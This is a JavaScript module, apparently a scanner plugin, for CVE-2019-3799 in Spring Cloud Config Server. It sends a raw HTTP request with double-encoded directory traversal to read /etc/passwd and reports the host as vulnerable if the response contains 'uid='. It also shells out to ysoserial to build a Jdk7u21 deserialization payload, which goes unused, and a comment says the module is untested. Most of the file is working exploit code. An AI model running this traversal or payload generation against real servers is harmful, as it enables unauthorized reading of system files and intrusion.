// 还没有成功测试
module.exports={
	tags: "spring,CVE-2019-3799,3799,web",
	des: "Spring Cloud Config Server 路径穿越与任意文件读取漏洞，CVE-2019-3799",
	dependencies:"",
	VulApps:[
		"https://mp.weixin.qq.com/s/roXk5ykq3Jqd4izEOrQ5qw"
	],
	urls:[
		
	],
    doCheck:function (url,fnCbk)
	{
        url = url.trim().replace(/[\s\r\n]*/gmi,'');
        var _t = this,_s = this.self,hst = _s.parseUrl(url);
        hst.port = hst.port||(-1 < hst.protocol.indexOf("https")?443:80);
        
        
        try{
            var szPay1 = _s.child_process.execSync("java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 '" + _s.g_szCmd + "'|base64|tr -d \"\n\"").toString("utf-8");
            // safe.cgi
            var len = 217 + szPay1.length,szPaload = `GET ..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252fpasswd HTTP/1.1
Host: ${hst.hostname}:${hst.port}
Accept: */*
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close


`;
            _s.fnSocket(hst.hostname,hst.port,szPaload,function(s)
            {
                var i = 0;
                s = String(s);
                var r = {"url":url,"send":szPaload,result:s};
                if(-1 < (i = s.indexOf("uid=")))
                {
                    r.vul = true;
                    fnCbk(r,_t);
                }
            });
        }catch(e){
            _s.error(e)}
	}
};